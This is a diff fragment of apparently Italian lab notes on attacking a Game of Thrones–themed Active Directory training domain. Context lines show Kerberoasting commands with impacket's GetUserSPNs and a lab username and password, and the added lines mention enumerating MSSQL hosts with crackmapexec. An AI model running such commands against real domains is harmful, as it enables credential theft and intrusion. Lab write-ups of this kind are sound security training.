@@ -291,3 +291,6 @@ impacket-GetUserSPNs north.sevenkingdoms.local/brandon.stark:iseedeadpeople
 GetUserSPNs.py -target-domain essos.local north.sevenkingdoms.local/brandon.stark:iseedeadpeople
 ```
 ![[Pasted image 20230830110943.png]]
+è possibile anche usare crackmapexec per enumerare
+
+mssql 192.168.56.22-23
